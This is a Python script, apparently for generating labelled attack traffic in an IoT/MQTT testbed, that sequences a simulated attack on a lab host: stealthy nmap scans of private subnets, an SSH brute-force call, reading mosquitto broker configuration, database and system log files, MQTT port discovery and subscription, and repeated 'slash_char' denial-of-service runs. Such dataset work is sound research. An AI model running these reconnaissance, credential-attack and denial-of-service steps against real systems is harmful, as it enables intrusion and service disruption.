import apts
import random
import time
import pickle
import pytz
from datetime import datetime
import os


def main():
    iteration = str(int(os.getenv("slash_char_num_it")) + 1)
    os.putenv("slash_char_num_it", iteration)
    experiments_details = []
    target = "10.0.0.20"
    attack_name = "slash_char"
    start_time_all = datetime.now(tz=pytz.UTC)

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    commands = "netstat -t;netstat -tuln;ss -tuln;ss -tr;ss -ntr;sudo nmap -sS -T1 -Pn 192.168.1.0/24;sudo nmap -sS -T1  -Pn 192.168.0.0/24;sudo nmap  -sS -T1 -Pn 10.0.0.0/24"
    command_list = commands.split(";")
    experiment = apts.initial_access(target, "1.1", command_list, attack_name, "netstat_nmap_T1", iteration,
                                     pause_commands=True,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 180))

    # 1) INITIAL ACCESS
    # ----------------------------------------------------------------------------------------------
    experiment = apts.initial_access(target, "1.2", command_list, attack_name, "netstat_nmap_T1", iteration,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 120))

    # 1opt) SSH BRUTEFORCE
    # ----------------------------------------------------------------------------------------------
    experiment = apts.brute_force("1.3", attack_name, 30)
    experiments_details.append(experiment)
    time.sleep(random.randint(0, 120))

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "cat /etc/mosquitto/mosquitto.conf;cat /etc/mosquitto/conf.d;cat /var/lib/mosquitto/mosquitto.db;cat /var/log/mosquitto/mosquitto.log; cat /var/log/syslog;cat /var/log/syslog"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.4", command_list2, attack_name, "mqtt_cat", iteration,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "sudo /usr/bin/nmap -sS -T2 -Pn -p 1883,8883 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.5", command_list2, attack_name, "nmap_mqtt", iteration,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 2) MQTT DISCOVERY
    # ---------------------------------------------------------------------------------------------
    commands2 = "nmap -T5 -p 1883,8883 -sV --script banner 10.0.0.0/24; nmap -p 1883,8883 --script mqtt-subscribe 10.0.0.0/24"
    command_list2 = commands2.split(";")
    experiment = apts.mqtt_discovery(target, "1.6", command_list2, attack_name, "nmap_banner_sub", iteration,
                                     sup_conclusion_pause=60)
    experiments_details.append(experiment)

    # 3) SLASH CHAR DOS
    # ---------------------------------------------------------------------------------------------
    experiments = apts.slash_char(target, "2.1", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.2", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.3", 20, iteration)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, "2.4", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.5", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.6", 20, iteration)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, "2.7", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.8", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.9", 20, iteration)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, "2.10", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.11", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.12", 20, iteration)
    experiments_details.append(experiments)

    time.sleep(random.randint(0, 100))

    experiments = apts.slash_char(target, "2.13", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.14", 20, iteration)
    experiments_details.append(experiments)
    experiments = apts.slash_char(target, "2.15", 20, iteration)
    experiments_details.append(experiments)

    end_time_all = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": 0,
        "attack_name": attack_name,
        "phase_name": "all_steps",
        "start_time": start_time_all,
        "end_time": end_time_all,
        "iteration": iteration,
    }
    experiments_details.append(experiment)
    with open('./output/exp_details.pkl', 'wb') as f:
        pickle.dump(experiments_details, f)
    print(experiments_details)


if __name__ == '__main__':
    main()
